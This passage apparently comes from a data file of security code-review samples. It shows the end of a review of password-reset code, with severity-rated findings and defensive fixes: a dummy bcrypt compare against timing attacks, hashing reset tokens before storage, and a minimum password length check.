  await bcrypt.compare(password, '$2b$12$dummy.hash.to.prevent.timing');
  return null;
}
```

### MEDIUM - Reset Token Not Hashed

**RT1: Plain text reset token in database (Severity: MEDIUM)**
If the database is breached, pending reset tokens are visible. Hash the token before storage:
```javascript
const resetToken = crypto.randomBytes(32).toString('hex');
const hashedToken = crypto.createHash('sha256').update(resetToken).digest('hex');
await this.db.users.update({ data: { resetToken: hashedToken, ... } });
// Send the unhashed token to the user, store the hash
```

### LOW - No Password Validation

**PV1: Any password accepted (Severity: LOW)**
No minimum length, complexity, or common-password checks. Add validation:
```javascript
if (newPassword.length < 8) throw new Error('Password too short');
```'''),
]
